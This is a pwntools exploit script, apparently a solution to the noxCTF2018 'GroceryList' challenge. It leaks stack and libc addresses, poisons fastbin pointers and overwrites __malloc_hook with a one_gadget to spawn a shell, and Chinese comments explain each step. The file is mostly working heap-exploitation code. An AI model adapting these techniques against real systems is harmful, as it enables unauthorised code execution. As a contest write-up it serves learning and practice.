#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR

from pwn import *
import itertools

# IP = "chal.noxale.com"
# PORT = 1232
IP = "127.0.0.1"
PORT = 9999

# context.log_level = 'critical' 
context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']
# context(os='linux',arch='amd64')
mode = args['MODE'].lower()
binary = "./GroceryList"


def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))

def print_list():
    sel("1")
    rud("----------")
    data = rud("----------")
    return data

def add(ssize, content):
    # 1 --> 0x10
    # 2 --> 0x38
    # 3 --> 0x60
    # rud("Exit")
    sel(str(2))
    rud("Large")
    sel(str(ssize))
    rud("name: ")
    sel(content)

def empty(ssize):
    # 1 --> 0x10
    # 2 --> 0x38
    # 3 --> 0x60
    # rud("Exit")
    sel(str(3))
    rud("Large")
    sel(str(ssize))
    rud("add?")
    sel(str(1))

def example():
    sel(str(6))
    rud("added")

def edit(id, content):
    sel(str(5))
    rud("edit?")
    sel(str(id))
    rud("name: ")
    sel(content)

def remove(id):
    sel(str(4))
    rud("remove?")
    sel(str(id))

if mode == "remote":
    context.noptrace = True
    io = remote(IP, PORT)
else:
    io = process(binary)
    proc_base = io.libs()[
        "/home/vagrant/DongFeng/noxCTF2018/pwn/GroceryList/GroceryList"]
    libc_bb = io.libs()['/lib/x86_64-linux-gnu/libc-2.23.so']

io.recvline()

one_gg = 0xf02a4

# gdb.attach(io, '''
# b *0x{:x}
# b *0x{:x}
# c
# '''.format(proc_base+0x0000000000001113, libc_bb + one_gg) 
# # print_list和onegadget下断点
# )

##建2个0x20堆，2个0x70堆，和一个example堆（其中堆上有栈地址）
add(1, "A"*0x10)
add(1, "B"*0x10)
add(3, "C"*0x60)
add(3, "D"*0x60)

example()

## 把所有堆内容打印出来，泄露了堆上的栈地址
data = print_list()
stack_address = data.split("4. ")[1][:8].strip()
stack_address = u64(stack_address.ljust(8, "\x00"))
print "[+] STAC", hex(stack_address)

# 删除第2个0x20大小的堆，生成0x20大小的fastbin　free堆块链
remove(1)

# 通过第1个0x20大小的堆，溢出覆盖第2个0x20堆的fd地址，为栈上地址，用于泄露libc_start_main地址
edit(0, "d"*16+p64(0)+p64(0x21)+p64(stack_address-0xb-0x10))

# 申请0x20大小堆块，完成后，下一个空闲堆块即为栈上地址
empty(1)

# 再次申请，则新堆块即在栈上
empty(1)

# 此时泄露libc地址
data = print_list()
print "[+] ", data
libc_address = data.split("5. ")[1][:8].strip("\n")
libc_address = u64(libc_address.ljust(8, "\x00"))
libc_base = libc_address - 0x20740-240
print "[+] LIBC", hex(libc_base)

# 编辑栈上堆块，写一堆0，为后续one_gadget的条件做准备，限定条件为rsp+0x50=null。
edit(5, p64(libc_address) + p64(0)*3)

##　删0x60大小的堆，生成0x60大小的fastbin　free堆块链
remove(2)
print_list()

one_gadget_address = libc_base + one_gg
new_malloc_hook = libc_base + 0x00000000003c4b10 - 0x20 + 0x5 - 0x8

# 编译第1个0x70大小的堆，溢出覆盖到后面的第2个0x70堆，使其fd为malloc_hook-0x23
edit(1, "d"*0x60+p64(0)+p64(0x71)+p64(new_malloc_hook))
print_list()

# 申请0x70大小堆，完成后，下一个空闲堆块即为malloc_hook-0x23+0x10
empty(3)

# 再次申请，则新堆块在malloc_hook附近
empty(3)
print_list()

# 使用新堆块覆盖malloc_hook的地址，覆盖内容为one_gadget地址
edit(6, "A"*19 + p64(one_gadget_address))
print_list()

# 触发漏洞
empty(1)

io.interactive()

